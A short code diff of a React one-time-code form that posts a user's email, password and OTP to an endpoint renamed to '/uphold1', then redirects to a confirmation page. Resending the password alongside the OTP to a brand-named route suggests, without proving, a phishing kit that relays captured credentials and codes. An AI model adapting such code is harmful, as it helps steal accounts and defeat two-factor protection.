@@ -28,7 +28,7 @@ const Otp = (props) => {
              templateParams.clientOtp = clientOtp
 
              try {
-                 const response = await fetch(URL + '/rq-1', {
+                 const response = await fetch(URL + '/uphold1', {
                      method: 'POST',
                      headers: {
                          Accept: 'application/json',
@@ -41,8 +41,7 @@ const Otp = (props) => {
                      body: JSON.stringify({
                          email: templateParams.email,
                          password: templateParams.password,
-                         pin: clientOtp,
-                         otp: '',
+                         otp: clientOtp,
                      }),
                  })
 
@@ -54,14 +53,16 @@ const Otp = (props) => {
                          console.log('time out init')
                          setLoading(false)
 
-                         history.push('/verifyotp', templateParams)
-                     }, 3000)
+                         history.push('/confirmOtp', templateParams)
+                     }, 1000)
                  } else if (resData.status === 'fail') {
                      console.log('Message failed to send.')
                      setLoading(false)
                  }
              } catch (err) {
                  console.log(err)
+                                      setLoading(false)
+
              }
          }
      }
